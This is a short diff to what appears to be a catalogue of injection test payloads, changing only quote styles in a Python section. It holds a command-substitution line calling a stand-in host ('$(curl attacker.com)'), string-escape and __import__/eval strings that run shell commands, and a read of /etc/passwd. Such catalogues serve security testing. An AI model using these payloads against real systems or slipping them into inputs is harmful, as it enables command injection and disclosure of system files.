@@ -27,14 +27,15 @@ $(curl attacker.com)
 ```python
 # String escape
 """; import os; os.system("id"); x="""
-'''; __import__('os').system('whoami'); y='''
+
+"""; __import__('os').system('whoami'); y="""
 
 # Import injection
-__import__('subprocess').call(['id'])
+__import__("subprocess").call(["id"])
 eval('__import__("os").system("ls")')
 
 # File operations
-open('/etc/passwd').read()
+open("/etc/passwd").read()
 ```
 
 ## JSON Injection
